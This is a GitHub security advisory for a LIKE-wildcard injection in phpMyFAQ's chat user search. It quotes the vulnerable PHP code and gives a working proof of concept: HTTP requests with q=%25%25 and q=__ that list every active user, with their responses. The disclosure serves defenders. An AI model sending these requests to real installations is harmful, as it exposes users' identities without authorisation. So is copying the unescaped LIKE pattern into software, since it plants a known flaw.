# [M] phpMyFAQ: SQL LIKE Wildcard Injection in Chat User Search Allows Authenticated User Enumeration

## Summary
Severity: Medium
Advisory: GHSA-6pvm-2vjj-rx4w
CVE: CVE-2026-47132
CWE: CWE-20, CWE-200, CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-08-12
Source: https://github.com/advisories/GHSA-6pvm-2vjj-rx4w
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.2.0-alpha

## Details
### Summary

  An authenticated SQL LIKE wildcard injection vulnerability in phpMyFAQ’s chat user search allows any logged-in user to bypass the intended display-name search  filter and enumerate active users. The endpoint escapes SQL string syntax but does not escape `%` and `_`, which remain active `LIKE` wildcards.

  ### Details

  The vulnerable endpoint is:
```
  GET /api/chat/users?q=...
```
  Source:
```php
  // phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/ChatController.php
  $query = trim($request->query->get('q', ''));

  if (mb_strlen($query) < 2) {
      return $this->json([
          'success' => true,
          'users' => [],
      ], Response::HTTP_OK);
  }

  $chat = new Chat($this->configuration);
  $users = $chat->searchUsers($query, $this->currentUser->getUserId());
```
  Sink:
```php
  // phpmyfaq/src/phpMyFAQ/Chat.php
  $escapedTerm = $this->configuration->getDb()->escape(mb_strtolower($searchTerm));

  $query = sprintf(
      "SELECT u.user_id, ud.display_name
       FROM %sfaquser u
       LEFT JOIN %sfaquserdata ud ON u.user_id = ud.user_id
       WHERE u.user_id != %d
         AND u.user_id > 0
         AND LOWER(ud.display_name) LIKE '%%%s%%'
         AND u.account_status = 'active'
       LIMIT %d",
      Database::getTablePrefix(),
      Database::getTablePrefix(),
      $excludeUserId,
      $escapedTerm,
      $limit,
  );
```
  `escape()` prevents SQL string breakout, but it does not escape SQL `LIKE` metacharacters. Therefore, attacker-controlled `%` and `_` are interpreted by the database as wildcards.

  The project already uses a safer pattern elsewhere with ESCAPE '|' and wildcard escaping, but this chat search path does not apply it.

  ### PoC: 

  Tested against:

  phpMyFAQ 4.2.0-alpha
  commit c0b7158df4bfb11d57b1ef7d471760583c9c2fae

  Prerequisite: attacker has any valid authenticated user account.

  1. Ensure there are multiple active users in the database, for example:
```
  userId=2 displayName="Alice Finance"
  userId=3 displayName="Bob Support"
  userId=4 displayName="Carol Engineering"
```
  2. Send a normal query that should not match any user:
```
  GET /api/chat/users?q=zz HTTP/1.1
  Host: target
  Cookie: [authenticated session]
```
  Observed response:
```
  {
    "success": true,
    "users": []
  }
```
  3. Send a wildcard query:
```
  GET /api/chat/users?q=%25%25 HTTP/1.1
  Host: target
  Cookie: [authenticated session]
```
  Observed response:
```
  {
    "success": true,
    "users": [
      {
        "userId": 2,
        "displayName": "Alice Finance"
      },
      {
        "userId": 3,
        "displayName": "Bob Support"
      },
      {
        "userId": 4,
        "displayName": "Carol Engineering"
      }
    ]
  }
```
  The same issue is reproducible with `_` wildcards:
```
  GET /api/chat/users?q=__ HTTP/1.1
  Host: target
  Cookie: [authenticated session]
```
  Local confirmation was also performed by calling the vulnerable phpMyFAQ\Chat::searchUsers() method directly with seeded users. q=zz returned no users, while `q=%%` and `q=__` returned active users.

  ### Impact

  This is a SQL LIKE wildcard injection / search filter bypass vulnerability. Any authenticated user can enumerate active user IDs and display names through the  chat user search endpoint. This may disclose internal user identities, staff names, department names, or other sensitive account information depending on deployment.

### Video PoC:

https://github.com/user-attachments/assets/b684893f-ccb1-42af-9568-50900793076f

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-6pvm-2vjj-rx4w
- https://github.com/thorsten/phpMyFAQ/commit/bd4b08b012234ccfcff07bfe6518062475b29e0a
- https://github.com/thorsten/phpMyFAQ
